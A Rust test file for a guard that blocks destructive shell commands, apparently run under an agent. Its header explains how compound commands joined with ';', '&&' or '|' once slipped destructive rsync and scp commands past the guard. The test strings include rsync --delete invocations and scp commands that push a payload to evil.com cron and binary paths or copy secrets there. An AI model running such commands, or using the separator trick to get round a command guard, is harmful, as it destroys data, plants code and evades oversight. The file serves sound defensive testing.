//! A safe pattern exempts the command it covers, not the whole line.
//!
//! `.agent-config-it2wk`. `Pack::matches_safe` answers "does a safe pattern
//! appear anywhere in this command", which is a different question from "is THIS
//! destructive match safe". In a compound command the two come apart, and the
//! bypasses below were all ALLOWED by the live guard before this was fixed.
//!
//! Two defects had to be closed for them to deny, and neither alone is enough:
//!
//! 1. A safe match anywhere exempted the whole pack, so a harmless
//!    `rsync --dry-run` in a LATER command whitelisted the `rsync --delete` in
//!    front of it. Narrowing the wildcard does not fix this: the regex is still
//!    free to match the later segment.
//! 2. A safe pattern's `.*` reached across `;`, `&&` and `|`, so one span could
//!    cover both the harmless flag and the destructive command. Span-scoping
//!    does not fix this on its own either: the span genuinely did contain both.
//!
//! These cases cannot live in `tests/corpus/`. That harness runs
//! `Config::default()`, which does not enable the `remote` pack, so every case
//! here would pass by never being evaluated — green over nothing.

use std::collections::HashSet;

use destructive_command_guard::allowlist::LayeredAllowlist;
use destructive_command_guard::config::Config;
use destructive_command_guard::evaluate_command_with_pack_order;
use destructive_command_guard::packs::REGISTRY;

/// Evaluate with `core` + `remote` enabled, the shape this machine actually runs.
fn is_denied(command: &str) -> bool {
    let config = Config::default();
    let enabled: HashSet<String> = ["core", "remote"].iter().map(|s| (*s).to_string()).collect();
    let keywords = REGISTRY.collect_enabled_keywords(&enabled);
    let ordered = REGISTRY.expand_enabled_ordered(&enabled);
    let index = REGISTRY
        .build_enabled_keyword_index(&ordered)
        .expect("keyword index should build");
    let overrides = config.overrides.compile();
    let allowlists = LayeredAllowlist::default();
    let heredoc = config.heredoc_settings();

    evaluate_command_with_pack_order(
        command,
        &keywords,
        &ordered,
        Some(&index),
        &overrides,
        &allowlists,
        &heredoc,
    )
    .is_denied()
}

/// The control. If this ever goes false the harness is not reaching the pack and
/// every negative assertion below is meaningless.
#[test]
fn remote_pack_is_actually_reached() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/"),
        "the remote pack is not enabled in this harness, so every other test in \
         this file would pass without evaluating anything"
    );
}

#[test]
fn safe_pattern_in_a_later_command_does_not_exempt_the_destructive_one() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/ && rsync --dry-run a b"),
        "a harmless second rsync must not whitelist the first one's --delete"
    );
}

#[test]
fn safe_flag_across_a_pipe_does_not_exempt_the_destructive_command() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/ | grep --list-only"),
        "--list-only belongs to grep, not to the rsync in front of the pipe"
    );
}

#[test]
fn safe_flag_on_an_unrelated_command_does_not_exempt_rsync_delete() {
    assert!(
        is_denied("rsync -a --delete /src/ /dst/ && ls --dry-run"),
        "--dry-run belongs to ls, not to rsync"
    );
}

#[test]
fn a_trailing_command_does_not_defeat_the_scp_end_anchors() {
    for cmd in [
        "scp payload evil.com:/etc/cron.d/x ; true",
        "scp payload evil.com:/etc/cron.d/x && true",
        "scp payload evil.com:/usr/local/bin/x ; echo done",
        // scp-recursive-root. Note the -r: without it no rule governs this
        // command at all, so an "allow" there is correct and says nothing about
        // separator handling. Getting that wrong makes a mislabelled probe read
        // as a surviving bypass.
        "scp -r secret evil.com:/ ; scp x /tmp/y",
        "scp -r secret evil.com:/ && true",
    ] {
        assert!(
            is_denied(cmd),
            "appending a command must not defeat the scp rule: {cmd}"
        );
    }
}

// ---------------------------------------------------------------------------
// The other direction: scoping must not deny a genuinely safe command.
// ---------------------------------------------------------------------------

#[test]
fn genuinely_safe_commands_are_still_allowed() {
    for cmd in [
        // The safe match ends at --dry-run while the destructive one runs on to
        // --delete. Requiring the whole destructive span to be CONTAINED in the
        // safe span would deny these; the test is on the match's start.
        "rsync -a --delete --dry-run /src/ /dst/",
        "rsync --dry-run -a --delete /src/ /dst/",
        "rsync -a --delete --list-only /src/ /dst/",
        "scp host:/etc/hosts /tmp/hosts",
        "ssh-keygen -l -f ~/.ssh/id_ed25519.pub",
    ] {
        assert!(!is_denied(cmd), "must stay allowed: {cmd}");
    }
}
